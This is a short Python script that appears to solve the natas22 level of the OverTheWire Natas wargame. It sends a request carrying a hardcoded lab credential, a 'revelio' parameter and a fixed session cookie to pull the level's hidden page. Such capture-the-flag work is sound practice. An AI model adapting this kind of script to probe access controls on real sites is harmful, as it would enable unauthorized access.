import requests
from requests.auth import HTTPBasicAuth 

def get_pass():
    auth = HTTPBasicAuth('natas22','chG9fbe1Tq2eWVMgjYYD1MsfIvN461kJ')
    param = {'revelio':'1'}
    cook = {'PHPSESSID':'a'}
    r = requests.get('http://natas22.natas.labs.overthewire.org/', auth=auth, params=param, cookies=cook)
    print(r.text)
if __name__ == '__main__':
    get_pass()
